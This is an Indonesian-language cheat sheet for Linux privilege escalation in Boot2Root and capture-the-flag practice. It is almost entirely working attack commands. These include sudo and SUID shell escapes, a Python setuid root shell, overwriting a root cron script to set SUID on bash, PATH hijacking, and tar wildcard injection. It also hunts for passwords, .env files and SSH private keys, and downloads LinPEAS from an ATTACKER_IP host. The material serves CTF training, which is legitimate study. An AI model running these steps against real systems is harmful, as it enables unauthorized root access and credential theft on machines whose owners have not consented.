# Boot2Root Privilege Escalation Cheat Sheet

> Checklist yang wajib dicek setelah mendapatkan shell pada VulnHub, Hack The Box, TryHackMe, maupun LKS Cyber Security.

---

# 1. Basic Enumeration

## Siapa saya?

```bash
whoami
id
```

## Informasi Host

```bash
hostname
uname -a
cat /etc/os-release
```

## User yang Sedang Login

```bash
w
who
```

---

# 2. SUDO

## Cek Hak Sudo

```bash
sudo -l
```

Contoh:

```text
(root) NOPASSWD: /usr/bin/vim
```

Artinya user dapat menjalankan vim sebagai root tanpa password.

### Mengapa Berbahaya?

Beberapa program dapat menjalankan command sistem.

### Contoh Exploit

```bash
sudo vim -c ':!/bin/bash'
```

Cari binary yang muncul di:

https://gtfobins.github.io

---

# 3. SUID

## Cari Binary SUID

```bash
find / -perm -4000 2>/dev/null
```

Contoh output:

```text
/usr/bin/find
/usr/bin/bash
/usr/bin/vim
```

### Mengapa Berbahaya?

Saat dijalankan, binary memakai privilege pemilik file.

Jika pemiliknya root maka binary berjalan sebagai root.

### Contoh Exploit

```bash
find . -exec /bin/sh \; -quit
```

atau

```bash
bash -p
```

---

# 4. Linux Capabilities

## Cari Capability

```bash
getcap -r / 2>/dev/null
```

Contoh:

```text
/usr/bin/python3 cap_setuid+ep
```

### Mengapa Berbahaya?

Binary dapat melakukan aksi root tanpa SUID.

### Contoh Exploit

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# 5. Cron Jobs

## Cek Cron

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.d/
```

```bash
ls -la /etc/cron.hourly/
```

```bash
ls -la /etc/cron.daily/
```

### Mengapa Berbahaya?

Root sering menjalankan script otomatis.

Jika script dapat ditulis user biasa maka privilege escalation mungkin terjadi.

### Contoh

```text
* * * * * root /opt/backup.sh
```

Cek permission:

```bash
ls -l /opt/backup.sh
```

Jika writable:

```bash
echo "chmod u+s /bin/bash" > /opt/backup.sh
```

Tunggu cron berjalan.

```bash
bash -p
```

---

# 6. Password Hunting

## Cari Password

```bash
grep -Ri password /home 2>/dev/null
```

```bash
grep -Ri password /var/www 2>/dev/null
```

Cari file:

```bash
find / -name "*.db" 2>/dev/null
```

```bash
find / -name "*.sql" 2>/dev/null
```

```bash
find / -name ".env" 2>/dev/null
```

### Mengapa Penting?

Password database sering digunakan ulang untuk:

- SSH
- FTP
- Admin Panel

---

# 7. SSH Key Hunting

## Cari Private Key

```bash
find / -name id_rsa 2>/dev/null
```

### Contoh

```text
/home/john/.ssh/id_rsa
```

Copy file lalu:

```bash
chmod 600 id_rsa
ssh -i id_rsa john@IP
```

---

# 8. PATH Hijacking

## Cek PATH

```bash
echo $PATH
```

### Mengapa Berbahaya?

Program root kadang memanggil command tanpa path lengkap.

Contoh:

```bash
backup
```

Bukan:

```bash
/usr/bin/backup
```

Jika folder writable ada di PATH:

```bash
echo "/bin/bash" > /tmp/backup
chmod +x /tmp/backup
```

Saat root menjalankan backup, file milik attacker yang dieksekusi.

---

# 9. Writable Files

## Cari File Writable

```bash
find / -writable 2>/dev/null
```

### File Menarik

```text
/etc/passwd
/etc/shadow
/root/
```

Periksa file yang seharusnya tidak dapat ditulis.

---

# 10. Running Processes

## Lihat Proses

```bash
ps aux
```

```bash
ps -ef
```

### Mengapa Penting?

Kadang password muncul pada command line.

Contoh:

```text
mysql -u root -ppassword123
```

---

# 11. Internal Services

## Cek Service Internal

```bash
ss -tulpn
```

atau

```bash
netstat -tulpn
```

Contoh:

```text
127.0.0.1:3306
127.0.0.1:8080
```

Tidak dapat diakses dari luar.

Namun dapat diakses dari shell yang sudah didapatkan.

---

# 12. History

## Cek History

```bash
history
```

```bash
cat ~/.bash_history
```

Contoh:

```text
mysql -u root -pSuperSecret123
```

atau

```text
ssh root@localhost
```

Sering berisi credential.

---

# 13. Wildcard Injection

Contoh Script Root:

```bash
tar czf backup.tar.gz *
```

Jika direktori writable:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Saat tar dijalankan, command attacker ikut dieksekusi.

---

# 14. NFS Misconfiguration

## Cek NFS

```bash
showmount -e IP
```

Contoh:

```text
/home
```

Jika menggunakan:

```text
no_root_squash
```

Attacker dapat membuat file SUID dan mendapatkan root.

---

# 15. Kernel Exploit

## Cek Versi Kernel

```bash
uname -a
```

```bash
cat /etc/os-release
```

Cari CVE yang sesuai.

Contoh terkenal:

- Dirty COW
- Dirty Pipe

Kernel exploit biasanya opsi terakhir.

---

# 16. LinPEAS

## Jalankan LinPEAS

```bash
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS akan mencari:

- SUDO
- SUID
- Capabilities
- Cron
- Password
- Writable Files
- Kernel Vulnerability

---

# Quick Checklist

Jalankan semua ini setelah mendapatkan shell:

```bash
id

sudo -l

find / -perm -4000 2>/dev/null

getcap -r / 2>/dev/null

cat /etc/crontab

history

ps aux

ss -tulpn

find / -name ".env" 2>/dev/null

find / -name id_rsa 2>/dev/null
```

Jika belum menemukan privilege escalation:

```bash
./linpeas.sh
```

---

# Rule of Thumb

Urutan yang paling sering menghasilkan root:

1. Password Bocor
2. SUDO Misconfiguration
3. SUID Binary
4. Cron Job
5. Writable File
6. Capabilities
7. PATH Hijacking
8. Wildcard Injection
9. NFS Misconfiguration
10. Kernel Exploit

> Enumerate first. Exploit later.
>
> Sebagian besar mesin Boot2Root berhasil diselesaikan karena enumeration yang baik, bukan karena exploit yang rumit.